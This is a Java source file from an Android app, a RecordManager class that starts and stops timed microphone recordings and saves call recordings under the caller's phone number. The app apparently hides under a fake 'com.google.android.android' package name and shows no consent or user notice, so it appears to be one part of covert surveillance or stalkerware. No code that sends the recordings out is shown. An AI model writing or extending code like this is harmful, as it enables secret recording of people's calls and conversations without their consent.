package com.google.android.android;

import android.media.MediaRecorder;
import android.os.Environment;
import android.util.Log;

import org.json.simple.JSONObject;

import java.io.File;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Timer;
import java.util.TimerTask;

/**
 * Created by Vetal on 28.07.2017.
 */

public class RecordManager {
    private final String TAG = RecordManager.class.getSimpleName();

    private MediaRecorder _mediaRecorder;
    private boolean _isRecording;
    private long _endTime;

    public boolean startRecord(int milliseconds, String phoneNumber) {
        if (_isRecording) return false;
        Log.i(TAG, "startRecord(" + milliseconds / 60 / 1000 + "min)");
        try {
            releaseRecorder();
            String date = MainService.getInstance().getSimpleDateFormat(System.currentTimeMillis());
            String fileName = Config.RECORD_PATH;

            if (phoneNumber != null)
                fileName = Config.CALLS_PATH + phoneNumber + " ";

            fileName += date + ".3gpp";
            File outFile = new File(fileName);
            if (outFile.exists()) {
                outFile.delete();
            }

            _mediaRecorder = new MediaRecorder();
            _mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            _mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
            _mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
            _mediaRecorder.setOutputFile(fileName);
            if (milliseconds != 0) _mediaRecorder.setMaxDuration(milliseconds);
            _mediaRecorder.prepare();
            _mediaRecorder.start();

            _isRecording = true;
            _endTime = System.currentTimeMillis() + milliseconds;

            if (milliseconds != 0) {
                setTimerForStopRecord(milliseconds);
            }

            return true;
        } catch (Exception e) {
            _isRecording = false;
            _endTime = 0;
            return false;
        }
    }

    public void stopRecord() {
        if (_mediaRecorder != null && _isRecording) {
            _mediaRecorder.stop();
        }
        _isRecording = false;
        _endTime = 0;
    }

    public boolean isRecording() {
        return _isRecording;
    }

    public long getEndTime() {
        return _endTime;
    }

    private class StopRecordTimerTask extends TimerTask {
        @Override
        public void run() {
            Log.i(TAG, "stopRecord in the timer!");
            stopRecord();
            cancel();
        }

    }

    private void setTimerForStopRecord(int milliseconds) {
        Timer timer = new Timer();
        timer.schedule(new StopRecordTimerTask(), milliseconds);
    }

    private void releaseRecorder() {
        if (_mediaRecorder != null) {
            _mediaRecorder.release();
            _mediaRecorder = null;
        }
    }



}
